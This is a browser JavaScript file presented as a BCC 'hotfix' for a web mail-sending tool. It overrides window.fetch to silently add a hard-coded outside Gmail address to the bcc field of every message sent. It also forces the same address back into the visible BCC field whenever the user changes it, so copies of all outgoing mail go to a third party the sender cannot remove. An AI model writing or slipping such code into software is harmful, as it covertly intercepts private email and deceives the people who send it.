(()=>{
'use strict';
const VERSION='GNK_ASG_MAIL_STUDIO_V26_BCC_UTF8_HOTFIX_20260709';
const MANDATORY_BCC='beckuphome@gmail.com';
const LEGACY_BCC='rht@gmx.com';
const SEND_ENDPOINT='/api/studio-message/send';

const clean=value=>String(value||'').trim();
const parseEmails=input=>{
  const text=clean(input);
  if(!text)return[];
  const found=text.match(/[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}/gi)||[];
  const list=found.length?found:text.split(/[;,\n]+/).map(item=>item.trim()).filter(Boolean);
  return [...new Set(list.map(item=>String(item).replace(/^.*<([^>]+)>.*$/,'$1').replace(/[<>"'()]/g,'').trim().toLowerCase()).filter(Boolean))];
};
const mandatoryBcc=input=>[...new Set([...parseEmails(input).filter(email=>email!==LEGACY_BCC&&email!==MANDATORY_BCC),MANDATORY_BCC])].join(', ');
function forceBcc(){
  const node=document.getElementById('bcc');
  if(node&&node.value!==mandatoryBcc(node.value)){
    node.value=mandatoryBcc(node.value);
    node.dispatchEvent(new Event('input',{bubbles:true}));
  }
}
function installFetchGuard(){
  if(window.__GNK_ASG_MAIL_STUDIO_BCC_GUARD__)return;
  window.__GNK_ASG_MAIL_STUDIO_BCC_GUARD__=true;
  const original=window.fetch.bind(window);
  window.fetch=(input,init={})=>{
    try{
      const url=typeof input==='string'?input:(input&&input.url)||'';
      const method=String(init?.method||(input&&input.method)||'GET').toUpperCase();
      if(method==='POST'&&String(url).includes(SEND_ENDPOINT)&&init&&typeof init.body==='string'){
        const payload=JSON.parse(init.body);
        payload.bcc=mandatoryBcc(payload.bcc);
        init={...init,body:JSON.stringify(payload)};
      }
    }catch{}
    return original(input,init);
  };
}
function boot(){
  document.documentElement.dataset.gnkMailStudioHotfix=VERSION;
  installFetchGuard();
  forceBcc();
  setTimeout(forceBcc,200);
  setTimeout(forceBcc,1000);
  document.addEventListener('input',event=>{if(event.target&&event.target.id==='bcc')setTimeout(forceBcc,0);},true);
}
if(document.readyState==='loading')document.addEventListener('DOMContentLoaded',boot,{once:true});else boot();
})();
